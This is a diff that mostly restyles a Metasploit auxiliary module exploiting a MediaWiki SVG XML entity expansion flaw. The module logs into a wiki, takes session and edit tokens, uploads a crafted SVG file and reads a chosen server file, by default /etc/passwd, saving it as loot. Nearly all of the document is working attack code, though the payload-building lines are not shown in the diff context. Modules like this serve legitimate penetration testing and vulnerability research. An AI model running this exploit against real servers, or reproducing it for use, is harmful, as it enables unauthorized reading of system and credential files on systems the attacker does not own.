@@ -1,20 +1,17 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'         => 'MediaWiki SVG XML Entity Expansion Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'MediaWiki SVG XML Entity Expansion Remote File Access',
+      'Description' => %q{
           This module attempts to read a remote file from the server using a vulnerability
         in the way MediaWiki handles SVG files. The vulnerability occurs while trying to
         expand external entities with the SYSTEM identifier. In order to work MediaWiki must
@@ -26,46 +23,44 @@ class MetasploitModule < Msf::Auxiliary
         $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something
         other than 'false'.
       },
-      'References'   =>
-        [
-          [ 'OSVDB', '92490' ],
-          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=46859' ],
-          [ 'URL', 'http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']
-        ],
-      'Author'       =>
-        [
-          'Daniel Franke',      # Vulnerability discovery and PoC
-          'juan vazquez',       # Metasploit module
-          'Christian Mehlmauer' # Metasploit module
-        ],
-      'License'      => MSF_LICENSE
+      'References' => [
+        [ 'OSVDB', '92490' ],
+        [ 'URL', 'https://phabricator.wikimedia.org/T48859' ],
+        [ 'URL', 'https://web.archive.org/web/20130421060020/http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']
+      ],
+      'Author' => [
+        'Daniel Franke', # Vulnerability discovery and PoC
+        'juan vazquez',       # Metasploit module
+        'Christian Mehlmauer' # Metasploit module
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
-    [
-      Opt::RPORT(80),
-      OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
-      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
-      OptString.new('USERNAME', [ false,  "The user to authenticate as"]),
-      OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
-    ], self.class)
+      [
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
+        OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
+        OptString.new('USERNAME', [ false, "The user to authenticate as"]),
+        OptString.new('PASSWORD', [ false, "The password to authenticate with" ])
+      ]
+    )
 
     register_autofilter_ports([ 80 ])
-    deregister_options('RHOST')
   end
 
   def get_first_session
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, "index.php"),
+      'method' => 'GET',
       'vars_get' => {
-        "title"    => "Special:UserLogin",
+        "title" => "Special:UserLogin",
         "returnto" => "Main+Page"
       }
     })
 
     if res && res.code == 200 && res.get_cookies =~ /([^\s]*session)=([a-z0-9]+)/
-      return $1,$2
+      return $1, $2
     else
       return nil
     end
@@ -73,10 +68,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_login_token
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, "index.php"),
+      'method' => 'GET',
       'vars_get' => {
-        "title"    => "Special:UserLogin",
+        "title" => "Special:UserLogin",
         "returnto" => "Main+Page"
       },
       'cookie' => session_cookie
@@ -87,22 +82,21 @@ class MetasploitModule < Msf::Auxiliary
     else
       return nil
     end
-
   end
 
   def parse_auth_cookie(cookies)
     cookies.split(";").each do |part|
       case part
-        when /([^\s]*UserID)=(.*)/
-          @wiki_user_id_name = $1
-          @wiki_user_id = $2
-        when /([^\s]*UserName)=(.*)/
-          @wiki_user_name_name = $1
-          @wiki_user_name = $2
-        when /session=(.*)/
-          @wiki_session = $1
-        else
-          next
+      when /([^\s]*UserID)=(.*)/
+        @wiki_user_id_name = $1
+        @wiki_user_id = $2
+      when /([^\s]*UserName)=(.*)/
+        @wiki_user_name_name = $1
+        @wiki_user_name = $2
+      when /session=(.*)/
+        @wiki_session = $1
+      else
+        next
       end
     end
   end
@@ -117,19 +111,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def authenticate
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'POST',
+      'uri' => normalize_uri(target_uri.to_s, "index.php"),
+      'method' => 'POST',
       'vars_get' => {
-        "title"  => "Special:UserLogin",
+        "title" => "Special:UserLogin",
         "action" => "submitlogin",
-        "type"   => "login"
+        "type" => "login"
       },
       'vars_post' => {
-        "wpName"         => datastore['USERNAME'],
-        "wpPassword"     => datastore['PASSWORD'],
+        "wpName" => datastore['USERNAME'],
+        "wpPassword" => datastore['PASSWORD'],
         "wpLoginAttempt" => "Log+in",
-        "wpLoginToken"   => @login_token,
-        "returnto"       => "Main+Page"
+        "wpLoginToken" => @login_token,
+        "returnto" => "Main+Page"
       },
       'cookie' => session_cookie
     })
@@ -144,17 +138,16 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_edit_token
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
+      'method' => 'GET',
       'cookie' => session_cookie
     })
 
-    if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" \/>/
+    if res and res.code == 200 and res.body =~ /<title>Upload file/ and res.body =~ /<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" \/>/
       return $1
     else
       return nil
     end
-
   end
 
   def upload_file
@@ -182,10 +175,10 @@ class MetasploitModule < Msf::Auxiliary
     data = post_data.to_s
 
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
-      'method'   => 'POST',
-      'data'     => data,
-      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
+      'uri' => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
+      'method' => 'POST',
+      'data' => data,
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'cookie' => session_cookie
     })
 
@@ -205,8 +198,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def read_data
     res = send_request_cgi({
-      'uri'      => @svg_uri,
-      'method'   => 'GET',
+      'uri' => @svg_uri,
+      'method' => 'GET',
       'cookie' => session_cookie
     })
 
@@ -269,7 +262,7 @@ class MetasploitModule < Msf::Auxiliary
 
     f = ::File.basename(datastore['RFILE'])
     path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-    print_status("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
+    print_good("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
   end
 
   def run
@@ -281,5 +274,4 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     accessfile(ip)
   end
-
 end
